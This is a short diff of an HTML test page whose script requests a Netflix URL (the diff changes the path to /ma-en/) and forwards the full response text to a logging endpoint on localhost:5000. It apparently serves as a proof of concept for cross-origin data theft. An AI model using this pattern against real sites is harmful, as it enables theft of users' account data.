@@ -4,7 +4,7 @@
         <h1>Hello World!</h1>
         <script>
             var xhr = new XMLHttpRequest();
-            var url = "https://www.netflix.com"
+            var url = "https://www.netflix.com/ma-en/"
             xhr.onreadystatechange = function() {
                 if (xhr.readyState == XMLHttpRequest.DONE){
                     fetch("http://localhost:5000/log?key=" + encodeURIComponent(xhr.responseText))
